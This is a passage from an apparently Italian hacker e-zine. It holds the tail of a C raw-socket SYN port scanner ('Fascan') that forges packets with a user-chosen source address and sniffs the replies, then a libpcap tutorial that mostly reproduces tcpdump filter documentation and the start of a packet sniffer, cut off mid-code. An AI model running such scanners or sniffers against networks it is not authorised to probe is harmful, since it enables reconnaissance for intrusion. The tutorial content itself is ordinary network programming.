    struct libnet_plist_chain *plist_p; /* plist chain pointer */

    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* descr;

    bpf_u_int32 maskp;
      bpf_u_int32 netp;


    plist_p = NULL;
    src_ip  = 0;
    dst_ip  = 0;
    src_prt = 0;

   dev = "ppp0";
    if(dev == NULL)
    { fprintf(stderr,"%s\n",errbuf); exit(1);

      }else printf("using device:%s\n",dev);

    pcap_lookupnet(dev,&netp,&maskp,errbuf);

    descr = pcap_open_live(dev,BUFSIZ,0,-1,errbuf);
    if(descr == NULL)
    { printf("pcap_open_live(): %s\n",errbuf); exit(1); }

    while((c = getopt(argc, argv, "d:s:p:")) != EOF)
    {
        switch (c)
        {
            case 'd':
                if (!(dst_ip = libnet_name_resolve(optarg, LIBNET_RESOLVE)))
                {
                    libnet_error(LIBNET_ERR_FATAL, "Bad destination IP address: %s\n", optarg);
                }
                break;
            case 's':
                if (!(cp = strrchr(optarg, '.')))
                {
                    usage(argv[0]);
                }
                *cp++ = 0;
                src_prt = (u_short)atoi(cp);
                if (!(src_ip = libnet_name_resolve(optarg, LIBNET_RESOLVE)))
                {
                    libnet_error(LIBNET_ERR_FATAL, "Bad source IP address: %s\n", optarg);
                }
                break;
	    case 'p':
                plist_p = &plist;
                if (libnet_plist_chain_new(&plist_p, optarg) == -1)
                {
                    libnet_error(LIBNET_ERR_FATAL, "Could not build port list\n");
                }
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }
    if (!src_ip || !src_prt || !dst_ip || !plist_p)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }



    /*
     *  We're just going to build a TCP packet with no payload using the
     *  raw sockets API, so we only need memory for a TCP header and an IP
     *  header.
     */
    packet_size = LIBNET_IP_H + LIBNET_TCP_H;

    /*
     *  Step 1: Memory initialization (interchangable with step 2).
     */
    libnet_init_packet(packet_size, &packet);

    if (packet == NULL)
    {
        libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");
    }

    /*
     *  Step 2: Network initialization (interchangable with step 1).
     */
    network = libnet_open_raw_sock(IPPROTO_RAW);
    if (network == -1)
    {
        libnet_error(LIBNET_ERR_FATAL, "Can't open network.\n");
    }

MAGENTA;
 printf("\n\n\t\t_______________________________________________\n\n");
 fflush(stdout); sleep(1);
 printf("\t\t\033[02A   F A S C A N is now working...please wait... \n\n");
 fflush(stdout);
 sleep(1);


    /*
     *  Step 3: Packet construction (IP header).
     */
    libnet_build_ip(LIBNET_TCP_H,   /* size of the packet sans IP header */
            IPTOS_LOWDELAY,         /* IP tos */
            242,                    /* IP ID */
            0,                      /* frag stuff */
            128,                    /* TTL */
            IPPROTO_TCP,            /* transport protocol */
            src_ip,                 /* source IP */
            dst_ip,                 /* destination IP */
            NULL,                   /* payload (none) */
            0,                      /* payload length */
            packet);                /* packet header memory */

    while (libnet_plist_chain_next_pair(plist_p, &bport, &eport))
    {
        while (!(bport > eport) && bport != 0)
        {
		cport = bport++;

    /*
     *  Step 3: Packet construction (TCP header).
     */
    libnet_build_tcp(src_prt,       /* source TCP port */
            cport,                  /* destination TCP port */
            0xa1d95,                /* sequence number */
            0x53,                   /* acknowledgement number */
            TH_SYN,                 /* control flags */
            1024,                   /* window size */
            0,                      /* urgent pointer */
            NULL,                   /* payload (none) */
            0,                      /* payload length */
            packet + LIBNET_IP_H);  /* packet header memory */


    /*
     *  Step 4: Packet checksums (TCP header only).
     */
    if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    {
        libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed\n");
    }


    /*
     *  Step 5: Packet injection.
     */

    c = libnet_write_ip(network, packet, packet_size);
    if (c < packet_size)
    {
        libnet_error(LN_ERR_WARNING, "libnet_write_ip only wrote %d bytes\n", c);
    }
    else
    {
        printf("construction and injection completed, wrote all %d bytes %d port\n", c, cport);
    }
	}



}


   pcap_loop(descr,-1,got_packet, NULL); /*
     *  Shut down the interface.
     */
   if (libnet_close_raw_sock(network) == -1)
    {
        libnet_error(LN_ERR_WARNING, "libnet_close_raw_sock couldn't close the interface");
    }

   libnet_destroy_packet(&packet);
   libnet_plist_chain_free(plist_p);


   pcap_close(descr);



   return (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);


}


void usage(char *name)
{

    CLEAR;
 fflush(stdout); sleep(1);
 printf("\033[1;36m     #### ####\n");
 printf("\033[1;36m      ##   ##\n");
 printf("\033[1;36m      ###  ##\n");
 printf("\033[1;34m      #### ##\n");
 printf("\033[1;34m      ## ####\n");
 printf("\033[1;34m     #### ####\n\n");

 fflush(stdout); sleep(1);
 printf("\033[1;36m     ######## \n");
 printf("\033[1;36m     ########  \n");
 printf("\033[1;36m      ###\n");
 printf("\033[1;34m      ######\n");
 printf("\033[1;34m      ###\n");               /* a big thx to pIGpEN  */
 printf("\033[1;34m     #####\n\n");


 fflush(stdout); sleep(1);
 printf("\033[1;36m     ########\n");
 printf("\033[1;36m     ########\n");
 printf("\033[1;36m         ###\n");
 printf("\033[1;34m        ###\n");
 printf("\033[1;34m      #######\n");
 printf("\033[1;34m     ########\n\n");
 fflush(stdout); sleep(1);

MAGENTA;
 printf("\033[15A\t\t\t\t       ________________\n");
 fflush(stdout); sleep(1);
 printf("\033[01A\t\t\t\t           F a s c a n \n\n");
 fflush(stdout); sleep(1);
 BLUE;
 printf("\t\t\t __________________________________________________\n\n");
 fflush(stdout); sleep(1);
 printf("\t\t\t\033[02A   S Y N   P o r t  S c a n  by  C i t y H u n t e r \n\n");
 fflush(stdout); sleep(1);
 CYAN;
 printf("\t\t\t\t ________________________________________\n");
 fflush(stdout); sleep(1);
 printf("\t\t\t\033[01A  w w w . n o f l y z o n e - c r e w . c j b . n e t\n\n");
 fflush(stdout); sleep(1);
 printf("\t\t\t\t _________________________________________\n");
 fflush(stdout); sleep(1);
 printf("\t\t\t\033[01A Usage: %s -s src_ip.s_port -d dst_ip -p <portlist>\n\n\n\n\n\n\n\n\n\n\n",name);
 sleep(2);
/*CLEAR;*/


}

void got_packet(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{

const struct sniff_ip *ip;
const struct sniff_tcp *tcp;
struct servent *service;


    int size_ip = sizeof(struct sniff_ip);
    int size_tcp = sizeof(struct sniff_tcp);

    ip = (struct sniff_ip*)(packet);
    tcp = (struct sniff_tcp*)(packet + size_ip);




    if (tcp->th_flags==(TH_SYN|TH_ACK))

    		{

		service = getservbyport(htons(ntohs(tcp->th_sport)), "tcp");
		printf("Porta %d  %s \n",ntohs(tcp->th_sport) ,(service) ? service->s_name : "unknown");
		}
		else if (tcp->th_flags==(TH_RST|TH_ACK)) printf("Porta closed\n");
    /*if ((tcp->th_seq==0)&&(tcp->th_ack==0x54)) printf("close");*/
}


/* EOF */


-----------------[SNIP]--------------------------------------------------------

Una piccola nota dolente prima di lasciarvi.Anzi 2:(
La prima è che se avete un portatile con un winmodem, lo scan delle porte avviene
in maniera parziale.E' così veloce a mandare pacchetti che intasa il buffer di
trasmissione e ogni tanto salta delle porte.Il problema l'ho risolto mettendo
una sleep() dopo un tot di porte, con il mio mettevo sleep(1) ogni 30 porte e
davo così il tempo di svuotarsi al buffer.Se avete altre soluzioni ditele!
Secondo prob...il prog è fatto per ppp0,modem normalissimi. Se siete su eth
dovete aggiungere 14 qui:  ip = (struct sniff_ip*)(packet+14);
		           tcp = (struct sniff_tcp*)(packet + size_ip+14);

Diciamo che ci sono funzioni apposite che vanno a livello datalink e aggiungono
loro il valore di offset,ma sono pigro e l'ho messo solo nello sniffer della prox
puntata:))Il prob è che non trovo il val per l'ISDN ippp0...se qualcuno lo sapesse
farebbe cosa gradita dirmelo!

Si possono saltare i saluti??Certo che no!!
Ovvi e scontati i saluti a tutti quelli della crew:):viciuz,click,vlad,evil e chi
c'è dentro e non mi viene in mente. Zukky,Pit,XpTerminator,naga,awgn,
Que[ZzZ]:P,kahuna,kernel(qualche numero),reef,FuSyS,pIGpEN,embyte ecc.

Musica ascoltata: Saint Germain (great acid jazz)
Consumo: nulla,sono le 2 di notte
Dedicato a: Elen:*
Fuck to: nessuno,sono buono:)

See Ya,(make me a bud,please) have a nice day:)
						CH

------------------------------------<END>--------------------------------------


-------------------------------------<15>--------------------------------------
------------------------------------<JAVA>-------------------------------------
-----------------------------------<anonimo>-----------------------------------

(*) vedi allegato.

------------------------------------<END>--------------------------------------


-------------------------------------<16>--------------------------------------
------------------------------------<Valk>-------------------------------------
-----------------------------------<LibPCAP>-----------------------------------

          +----------------------------------+
          | Autore: ValK                     |
          | Titolo: LibPCAP: a Socket Story  |
          | Mail: valk@mojodo.it             |
          | Http://www.mojodo.it             |
          | Http://www.noflyzone.org         |
          +----------------------------------+

+----------------------------------------------------------------------------------+
|                                                                                  |
+-[SOMMARIO]-----------------------------------------------------------------------+
+---(Intro)------------------------------------------------------------------------+
+---(How It Work)------------------------------------------------------------------+
+---(Start: Non Aprite quel device)------------------------------------------------+
+---(I Filtri)---------------------------------------------------------------------+
+---(Filter Man Pages)-------------------------------------------------------------+
+---(Sniff... Ohhh It Smells Good)-------------------------------------------------+
+---(Conclusioni)------------------------------------------------------------------+
+-[FINE]---------------------------------------------------------------------------+
|                                                                                  |
+---(Intro)------------------------------------------------------------------------+
| le  libcap sono  delle librerie  atte a  catturare i  pacchetti tcp  e udp   che |
| arrivano su  una determinata  periferica. Utilizzando  un sistema  di filtraggio |
| identico a quello del  tcpdump, infatti vengono usate  con il tcpdump, rende  la |
| cattura di socket a livello datalink una passeggiata di salute. Scopo di  questo |
| doc e' una trattazione sintetica di  come usare le libPCAP, in allegato  c'e' un |
| programma  di  sniffing  molto  semplice, che  ho  scritto  mentre  le studiavo, |
| ringrazio   harada   e  LordFelix   per   l'help  datomi,   inoltre   rimando  a |
| http://www.tcpdump.org/pcap.htm e  alla lettura  di Unix  Network Programming di |
| R.W.Stevens. Buona Lettura                                                       |
|                                                                                  |
+---(How It Work)------------------------------------------------------------------+
| Principalmente le libPCAP  aprono un device  catturano un pacchetto  rispondendo |
| alle specifiche della stringa di filtraggio da noi impostata e ci  restituiscono |
| un puntatore, dopo di che attraverso  il cast di questo puntatore riempiremo  le |
| strutture asseconda di cosa ci serve.                                            |
| Generalmente  le funzioni  delle LibPCAP  utilizzano un  buffer di  ritorno che  |
| generalmente segnala  gli, eventuali  errori che  si possono  verificare durante |
| l'esecuizione delle funzioni.                                                    |
|                                                                                  |
+---(Start: Non Aprite quel device)------------------------------------------------+
|                                                                                  |
| La prima cosa da fare e' aprire il device di lettura in modo da poter  catturare |
| i pacchetti in arrivo  senza pensare a cose  troppo strane il device  e' solo un |
| array o un puntatore a caratteri che contiene il nome della periferica da aprire |
| nel caso di linux ad esempio il device ppp0, eth0, sit0 , etc.                   |
|                                                                                  |
| Nel caso in cui si voglia prendere il primo device disponibele si puo' ricorrere |
| alla funzione:                                                                   |
|                                                                                  |
|       char *pcap_lookupdev(errbuf);                                              |
|                                                                                  |
| Che  restituisce  un  puntatore  a  carattere e  dove  errbuf  e'  un  array di  |
| lunghezza PCAP_ERRBUF_SIZE variabile globale delle pcap. dopo di che si fa'  il  |
| lookup della rete con:                                                           |
|                                                                                  |
|       pcap_lookupnet(DEVICE , &NETADDR , &NETMASK , errbuf);                     |
|                                                                                  |
| dove netaddr e netmask sono bpf_u_int32, e al loro interno dopo aver eseguito la |
| funzione avremo l'indirizzo di rete del  device e la netmask dello stesso,  come |
| al solito errbuff e' un buffer di errore. Selezionato il device lo si  apre , a  |
| tale scopo esiste la funzione :                                                  |
|                                                                                  |
|       pcap_t *pcap_open_live(DEVICE, BUFSIZ, PROMISC, ERROR, errbuf);            |
|                                                                                  |
| Dove:                                                                            |
|    DEVICE e' un device di sistema come descritto sopra                           |
|                                                                                  |
|    BUFSIZ  e' una variabile  globale della  PCAP  che  indica la grandezza della |
|            buffer                                                                |
|    PROMISC se 1 mette la periferica di lettura in modalità promisc mentre se  0 |
|            no                                                                    |
|    ERRBUF  solito buffer tipico della PCAP                                       |
|                                                                                  |
| Ora la  funzione restituisce  un tipo  pcap_t che  naturalmente e' proprio della |
| PCAP notare che DEVE  essere un puntatore, sembra  strano ma se non  lo dichiaro |
| puntatore sulla mia macchina neanche compila. Ora quello che ci resta da fare e' |
| compilare e applicare i filtri.                                                  |
|                                                                                  |
+---(I Filtri)---------------------------------------------------------------------+
|                                                                                  |
|      int pcap_compile(pcap_t *p, struct bpf_program *fp, char *str,              |
|                       int optimize, bpf_u_int32 netmask);                        |
|                                                                                  |
| Ecco la funzione che  si occupa di "compilare"  il device aperto, dove  *p e' un |
| puntatore  pcap_t al  device aperto  struct bpf_program  *fp e'  una  struttura  |
| filtro, char  *str la  stringa che  definisce il  filtro usato,  optimize e'  un |
| valore  intero e   netmask e'  di tipo  bpf_u_int32 che  corrisponde al   valore |
| restituito da pcap_lookupnet(). Ora per la stringa str riporterò alla fine  del |
| doc le man pages sulla formazione del filtro per  ora vi basti sapere che str |
| corrisponde al filtro che intendete applicare al device.                         |
|                                                                                  |
|      int pcap_setfilter(pcap_t *p, struct bpf_program *fp);                      |
|                                                                                  |
| Dove *p e' il nostro solito device e struct bpf_program *fp e' il nostro filtro. |
| Ora abbiamo settato il filtro cioè tutta la massa di pacchetti che giungerà sul |
| nostro device verrà prima selezionata e poi passata al programma.               |
|                                                                                  |
+---(Sniff... Ohhh It Smells Good)-------------------------------------------------+
|                                                                                  |
| Si,abbiamo settato i pacchetti, ma come li recuperiamo i pacchetti che arrivano? |
| Ovvio che c'e' una funzione che lo fa, e nello specifico e':                     |
|                                                                                  |
|      u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)                         |
|                                                                                  |
| La  funzione  restituisce  un  puntatore  a  caratteri  contenente  il pacchetto |
| catturato  da  *p cioè  la  fd della  pcap  con il  device  aperto seguendo  la |
| struttura pcap_pkthdr che dichiareremo  sapientemente all'inizio. Ora, ci  tocca |
| sapere che layer c'e' prima  dei pacchetti che interessano a noi  ovvero nel |
| mio  caso il  pacchetto ip,  per fare  ciò, c'e'  una funzione  che riporta  il  |
| datalink del pacchetto:                                                          |
|                                                                                  |
|      int pcap_datalink(pcap_t *p)                                                |
|                                                                                  |
| Il datalink determina il tipo di header che c'e' all'intestazione del  puntatore |
| di modo  che con  opportuni cast  sia possibile  ottenere le  informazioni a noi |
| necessarie quali  ip packet,  tcp packet  e udp  packet. Per  maggiori info  sui |
| datalink e sui valori  da esso assunti rimando  a "man pcap" inoltre  ci tengo a |
| far notare che ho trovato problemi con  il datalink di numero 113 del valore  di |
| 20byte in  quanto non  e' elencato  nel man.  Sapendo il  datalink otteniamo  un |
| offset (che ci  dobbiamo calcolare da  soli naturalmente) che  sarà aggiunto al |
| primo cast che faremo ad esempio per  recuperare la struttura ip o tcp o  ancora |
| udp. Porto ora un esempio, un programma che ho fatto io stesso durante lo studio |
| delle libpcap , faccio  notare che le eccezioni  non sono gestite in  quanto era |
| solo un  test e  che necessita  di user  root per  funzionare, inoltre non penso |
| faccia male a nessuno un bel "man pcap".                                         |
|                                                                                  |
+---(Filter Man Pages)-------------------------------------------------------------+
|                                                                                  |
| The expression consists of one  or more primitives.  Primitives usually  consist |
| of an id (name or number) preceded  by one or more qualifiers.  There are  three |
| different kinds of qualifier:                                                    |
|                                                                                  |
| type :  qualifiers say  what kind  of thing  the id  name or  number refers  to. |
| Possible types  are host,   net and   port.   E.g.,   `host  foo',  `net 128.3', |
| `port 20'.  If there is no type qualifier, host is assumed.                      |
|                                                                                  |
| dir :  qualifiers  specify a  particular transfer  direction to  and/or from id. |
| Possible  directions  are src,  dst,  src   or dst and src and dst.   E.g., `src |
| foo',  `dst net  128.3', `src  or dst  port ftp-  data'.  If  there is  no dir   |
| qualifier, src or dst is assumed.  For `null' link layers (i.e.  point to  point |
| protocols  such  as  slip) the inbound  and outbound qualifiers  can be used  to |
| specify a desired direction.                                                     |
|                                                                                  |
| proto  :  qualifiers restrict  the  match to  a  particular protocol.   Possible |
| protos are:  ether,  fddi,  tr, ip,  ip6, arp, rarp, decnet, tcp and udp.  E.g., |
| `ether  src foo',  `arp net   128.3', `tcp  port 21'.   If there  is no   proto  |
| qualifier, all  protocols consistent  with the  type are  assumed.   E.g.,  `src |
| foo' means  `(ip or  arp or  rarp) src  foo' (except  the  latter  is not  legal |
| syntax), `net  bar'  means  `(ip or  arp or  rarp) net  bar' and `port 53' means |
| `(tcp or udp) port 53'.                                                          |
|                                                                                  |
| [`fddi' is actually an alias for `ether'; the parser treats them identically  as |
| meaning ``the data  link level used on the specified network interface.''   FDDI |
| headers  contain Ethernet-like  source and  destination  addresses, and  often |
| contain Ethernet-like packet types, so  you can filter  on  these   FDDI  fields |
| just as  with the  analogous Ethernet  fields.  FDDI  headers also contain other |
| fields, but you cannot name them explicitly in a filter expression.              |
|                                                                                  |
| Similarly, `tr'  is an  alias for  `ether'; the  previous paragraph's statements |
| about  FDDI  headers  also apply to Token Ring headers.]                         |
|                                                                                  |
| In  addition  to  the  above,  there are some special `primitive'  keywords that |
| don't  follow  the pattern:  gateway,  broadcast, less,  greater  and arithmetic |
| expressions.  All of these are described below.                                  |
|                                                                                  |
| More complex filter expressions are built up by using the words and, or and  not |
| to  combine   primitives. E.g.,   `host foo  and not  port ftp  and not port ftp |
| -data'.  To save typing, identical  qualifier lists can be omitted.   E.g., `tcp |
| dst port ftp or ftp-data or domain' is exactly the same as `tcp dst port ftp  or |
| tcp dst port ftp-data or tcp dst port domain'.                                   |
|                                                                                  |
| Allowable primitives are:                                                        |
|                                                                                  |
| dst host  host  : True   if  the  IPv4/v6 destination   field of  the  packet is |
| host, which may be either an address or a name.                                  |
|                                                                                  |
| src host host  : True if the IPv4/v6 source field of the packet is host.         |
|                                                                                  |
| host host : True if  either  the  IPv4/v6 source  or destination  of  the packet |
| is  host.   Any of   the   above  host  expressions  can be  prepended  with the |
| keywords, ip, arp, rarp,  or ip6  as in:  ip host host  which  is equivalent to: |
| ether  proto \ip and host  host If host  is a name  with multiple IP  addresses, |
| each address will be checked for a match.                                        |
|                                                                                  |
| ether dst ehost :  True  if  the ethernet  destination address is ehost.   Ehost |
| may be   either a   name from   /etc/ethers or   a number   (see ethers(3N)  for |
| numeric format).                                                                 |
|                                                                                  |
| ether src ehost : True if the ethernet source address is ehost.                  |
|                                                                                  |
| ether host ehost : True if either the ethernet source or destination address  is |
| ehost.                                                                           |
|                                                                                  |
| gateway host : True  if the packet used  host as a gateway.   I.e., the ethernet |
| source or destination address   was host  but neither  the IP source nor  the IP |
| destination  was host.   Host must  be a  name and  must be  found both  by the  |
| machine's host-name-to-IP-address resolution mechanisms (host name  file,   DNS, |
| NIS,   etc.)  and  by  the  machine's  host-name-to-Ethernet-address  resolution |
| mechanism (/etc/ethers, etc.).   (An equivalent expression  is ether host  ehost |
| and not host  host which can  be used with  either names or  numbers for host  / |
| ehost.)   This syntax  does not   work  in  IPv6-enabled configuration  at this  |
| moment.                                                                          |
|                                                                                  |
| dst net net  : True  if   the  IPv4/v6 destination  address of the  packet has a |
| network number of net.  Net may be either a name from /etc/networks or a network |
| number (see networks(4) for details).                                            |
|                                                                                  |
| src net net  : True if  the IPv4/v6 source  address of the  packet has a network |
| number of net.                                                                   |
|                                                                                  |
| net net : True if either the IPv4/v6 source or destination address of the packet |
| has a  network  number  of net.                                                  |
|                                                                                  |
| net net mask  netmask : True   if the IP  address matches net  with the specific |
| netmask.  May be qualified with src or  dst. Note that this syntax is not  valid |
| for IPv6 net.                                                                    |
|                                                                                  |
| net net/len : True  if the IPv4/v6 address  matches net with a  netmask len bits |
| wide.  May be qualified with  src or dst.                                        |
|                                                                                  |
| dst port port :  True  if  the  packet   is  ip/tcp, ip/udp, ip6/tcp  or ip6/udp |
| and has a destination port  value of port.  The port  can be a number or  a name |
| used in /etc/services (see  tcp(4P) and udp(4P)).  If   a name  is  used,   both |
| the port  number and  protocol are  checked.  If  a number  or ambiguous name is |
| used,  only the  port number  is checked  (e.g., dst  port 513  will print  both |
| tcp/login   traffic   and  udp/who  traffic, and  port  domain  will  print both |
| tcp/domain and udp/domain traffic).                                              |
|                                                                                  |
| src port port : True if the packet has a source port value of port.              |
|                                                                                  |
| port port : True  if  either  the  source  or  destination port of the packet is |
| port.  Any of the above port expressions can be prepended with the keywords, tcp |
| or udp, as  in: tcp src  port port which  matches only tcp  packets whose source |
| port is port.                                                                    |
|                                                                                  |
| less length :  True if the  packet has a  length less than  or equal to  length. |
| This is equivalent to: len <= length.                                            |
|                                                                                  |
| greater length  : True  if the  packet has  a length  greater than  or equal  to |
| length.  This is equivalent to: len >= length.                                   |
|                                                                                  |
| ip proto protocol : True if the packet is an IP packet (see ip(4P)) of  protocol |
| type protocol.   Protocol  can  be  a number  or  one of the names icmp,  icmp6, |
| igmp, igrp, pim,  ah, esp, vrrp,  udp, or tcp.   Note that the  identifiers tcp, |
| udp, and icmp are also keywords and must be escaped via backslash (\), which  is |
| \\ in the C-shell.  Note that this primitive does not chase the protocol  header |
| chain.                                                                           |
|                                                                                  |
| ip6 proto protocol :  True  if  the  packet  is an IPv6 packet  of protocol type |
| protocol.  Note that this primitive does not chase the protocol header chain.    |
|                                                                                  |
| ip6  protochain protocol  : True  if the  packet is  IPv6 packet,  and contains  |
| protocol  header  with type  protocol  in its   proto-  col header  chain.   For |
| example, ip6 protochain 6 matches  any  IPv6  packet with TCP protocol header in |
| the protocol header chain.  The packet may contain, for example,  authentication |
| header, routing header, or hop-by-hop  option header, between IPv6  header   and |
| TCP  header.   The BPF code emitted  by this primitive is complex and  cannot be |
| optimized by BPF optimizer code in tcpdump, so this can be somewhat slow.        |
|                                                                                  |
| ip protochain protocol : Equivalent to ip6 protochain protocol, but this is  for |
| IPv4.                                                                            |
|                                                                                  |
| ether broadcast : True if the packet is an ethernet broadcast packet.  The ether |
| keyword is optional.                                                             |
|                                                                                  |
| ip broadcast : True if the packet is an IP broadcast packet.  It checks for both |
| the  all-zeroes   and  all-ones  broadcast conventions,  and looks  up the local |
| subnet mask.                                                                     |
|                                                                                  |
| ether multicast : True  if  the  packet  is  an ethernet multicast packet.   The |
| ether keyword is optional.  This is shorthand for `ether[0] & 1 != 0'.           |
|                                                                                  |
| ip multicast : True if the packet is an IP multicast packet.                     |
|                                                                                  |
| ip6 multicast : True if the packet is an IPv6 multicast packet.                  |
|                                                                                  |
| ether proto protocol : True if  the packet is of ether type  protocol.  Protocol |
| can be  a number  or one  of the   names  ip,  ip6,  arp,   rarp,  atalk,  aarp, |
| decnet,  sca,  lat,  mopdl,  moprc,  iso,  stp,  ipx,  or  netbeui.   Note these |
| identifiers are also keywords and must be escaped via backslash (\).             |
|                                                                                  |
|        [In the case of  FDDI (e.g., `fddi protocol  arp') and Token Ring  (e.g., |
|        `tr   protocol   arp'),  for  most   of  those   protocols,  the protocol |
|        identification comes from  the 802.2 Logical  Link Control (LLC)  header, |
|        which is usually layered on top of the FDDI or Token Ring header.         |
|                                                                                  |
|        When  filtering for  most protocol  identifiers on  FDDI or  Token Ring,  |
|        tcpdump checks only  the  protocol   ID  field of  an LLC header  in so |
|        -called  SNAP  format with  an  Organizational Unit  Identifier  (OUI) of |
|        0x000000, for encapsulated Ethernet; it doesn't check whether the  packet |
|        is in SNAP for- mat with an OUI of 0x000000.                              |
|                                                                                  |
|        The   exceptions  are iso,  for  which it  checks  the DSAP  (Destination |
|        Service Access Point)  and SSAP (Source  Service Access Point)  fields of |
|        the LLC header, stp  and netbeui, where it  checks the DSAP of   the  LLC |
|        header, and atalk, where it checks  for a SNAP-format packet with an  OUI |
|        of 0x080007 and the Appletalk etype.                                      |
|                                                                                  |
|        In the case of Ethernet, tcpdump checks the Ethernet type field for  most |
|        of those protocols;  the exceptions  are iso, sap, and netbeui, for which |
|        it checks for an  802.3 frame and then  checks the LLC header  as it does |
|        for  FDDI  and  Token  Ring, atalk,  where  it   checks   both  for   the |
|        Appletalk etype in an Ethernet frame  and for a SNAP-format packet as  it |
|        does for FDDI and Token Ring, aarp, where it checks for the Appletalk ARP |
|        etype in either an Ethernet frame  or an  802.2  SNAP  frame with  an OUI |
|        of 0x000000, and ipx,  where it checks for  the IPX etype in  an Ethernet |
|        frame, the  IPX DSAP  in the  LLC header,  the 802.3  with no  LLC header |
|        encapsulation of IPX, and the IPX etype in a SNAP frame.]                 |
|                                                                                  |
| decnet src host : True  if  the  DECNET source address is host, which may  be an |
| address  of the  form ``10.123'',  or a  DECNET host  name.  [DECNET  host name  |
| support  is  only available  on  Ultrix systems  that  are configured  to run |
| DECNET.]                                                                         |
|                                                                                  |
| decnet dst host : True if the DECNET destination address is host.                |
|                                                                                  |
| decnet host host :  True if either the  DECNET source or destination  address is |
| host.                                                                            |
|                                                                                  |
| ip, ip6, arp, rarp, atalk, aarp, decnet, iso, stp, ipx, netbeui :  Abbreviations |
| for: ether proto p where p is one of the above protocols.                        |
|                                                                                  |
| lat, moprc, mopdl : ether proto  p where  p  is   one of the                     |
| above protocols.  Note that tcpdump does  not currently know how to parse  these |
| protocols.                                                                       |
|                                                                                  |
| vlan [vlan_id] : True if the packet is an IEEE 802.1Q VLAN packet.  If [vlan_id] |
| is specified, only   true  is  the  packet  has  the   specified  vlan_id.  Note |
| that  the first  vlan keyword  encountered in  expression changes  the decoding  |
| offsets for the remainder of expression  on the assumption that the packet  is a |
| VLAN packet.                                                                     |
|                                                                                  |
| tcp, udp, icmp : Abbreviations for: ip proto p or ip6 proto p where p is one  of |
| the above protocols.                                                             |
|                                                                                  |
| iso proto  protocol :  True  if   the packet  is an  OSI packet of protocol type |
| protocol.  Protocol can be a number or one of the names clnp, esis, or isis.     |
|                                                                                  |
| clnp, esis, isis : Abbreviations  for: iso proto p where  p is one of the  above |
| protocols.  Note that tcpdump does an incomplete job of parsing these protocols. |
|                                                                                  |
| expr relop expr : True  if the relation  holds, where relop is one of >, <,  >=, |
| <=, =, !=, and  expr is an arithmetic  expression composed of integer  constants |
| (expressed in standard  C  syntax),  the  normal  binary operators  [+,  -,   *, |
| /, &, |], a length operator, and special packet data accessors.  To access  data |
| inside the packet, use the following syntax: proto [ expr : size ] Proto is  one |
| of ether,  fddi, tr,  ip, arp,  rarp, tcp,  udp, icmp  or ip6, and indicates the |
| protocol  layer  for   the  index   operation.   Note  that tcp,  udp and  other |
| upper-layer protocol types only apply to  IPv4, not IPv6 (this will be  fixed in |
| the future).  The byte  offset,   relative  to  the indicated  protocol   layer, |
| is given by  expr.  Size is  optional and indicates  the number of  bytes in the |
| field of interest;  it can be  either one, two,  or four, and  defaults to  one. |
| The  length  operator, indicated  by the  keyword len,  gives the  length of the |
| packet.                                                                          |
|                                                                                  |
|        For  example,  `ether[0]  & 1 !=  0' catches all  multicast traffic.  The |
|        expression `ip[0] & 0xf != 5'  catches all IP packets with options.   The |
|        expression  `ip[6:2]   &   0x1fff   =   0'   catches   only  unfragmented |
|        datagrams   and  frag  zero  of  fragmented  datagrams.   This  check  is |
|        implicitly applied to  the tcp and  udp index operations.   For instance, |
|        tcp[0] always means the first byte of the TCP header, and never means the |
|        first byte of an intervening fragment.                                    |
|                                                                                  |
|        Some  offsets and field values may  be expressed as names rather than  as |
|        numeric  values.   The  fol- lowing  protocol  header  field offsets  are |
|        available: icmptype (ICMP type  field),  icmpcode  (ICMP code field), and |
|        tcpflags (TCP flags field).                                               |
|                                                                                  |
|        The  following   ICMP  type  field values  are available: icmp-echoreply, |
|        icmp-unreach,  icmp-source-   quench,  icmp-redirect,   icmp-echo,   icmp |
|        -routeradvert,   icmp-routersolicit,   icmp-timxceed,   icmp-  paramprob, |
|        icmp-tstamp,  icmp-tstampreply, icmp-ireq, icmp-ireqreply,  icmp-maskreq, |
|        icmp-maskre- ply.                                                         |
|                                                                                  |
|        The following TCP  flags field values  are available: tcp-fin,   tcp-syn, |
|        tcp-rst,  tcp-push,  tcp- push, tcp-ack, tcp-urg.                         |
|                                                                                  |
+---(Conclusioni)------------------------------------------------------------------+
|                                                                                  |
| Concludendo questa infarinata sulle libpcap lascio sfogo alle vostre fantasie.   |
| Le potenzialità sono immense , auguri a tutti =D                                |
+----------------------------------------------------------------------------------+

---------------[CODE]---[ASS: Another Stupid Sniffer]----------------------------[+]

/*

  [*] libPCAP Study [*]

Siti e Docs Consultati:
http://www.tcpdump.org/pcap.htm
Unix NetWork Programming, W. Richard Stevens, Cap. 26 Par. 5
man pcap

        ASS : Another Stupid Sniffer
to compile : gcc -o $bin ass.c -lpcap
*/

// Include
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <getopt.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

extern char *optarg;
extern int optind, opterr, optopt;

//Define Personali

char *pProt;
int i=1;

//Richiesti dalla Libreria

char errbuf[PCAP_ERRBUF_SIZE];
char *pcap_device;
pcap_t *pcap_fd;
struct bpf_program filter;
bpf_u_int32 netmask;            /* The netmask of our sniffing device */
bpf_u_int32 netaddr;            /* The Ip of our sniffing device */
struct pcap_pkthdr pcap_hdr;    /* The header that pcap gives us */
const u_char *pcap_pkt;         /* The actual packet */


//      Prototipi Per Il Packet

struct iphdr *ip; /* The IP header */

char *protocollo;
//Prototipi
int main(int argc, char **argv);
void usage(char *bin);

int main(int argc, char **argv)
        {
        char c;
        //Options
        while ((c = getopt(argc, argv,"d:p:h")) != -1)
                {
                if ( !optarg  && c!='h')
                        {
                        c='h';
                        }
                switch(c)
                        {
                        case 'd':
                                pcap_device=malloc(strlen(optarg));
                                strncpy( pcap_device , optarg , strlen(optarg) );
                                break;
                        case 'p':
